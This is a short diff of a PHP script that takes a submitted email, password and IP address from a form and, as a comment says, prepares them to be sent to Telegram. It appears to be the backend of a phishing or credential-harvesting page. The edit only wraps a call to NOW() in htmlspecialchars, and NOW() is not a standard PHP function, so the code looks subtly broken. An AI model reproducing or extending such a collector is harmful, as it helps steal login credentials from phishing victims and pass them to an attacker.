@@ -15,7 +15,7 @@ $result = pg_query($query);
     $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
     $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
     $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-    $time = NOW();
+    $time = htmlspecialchars(NOW());
 
 
 // Define message structure before sending to Telegram
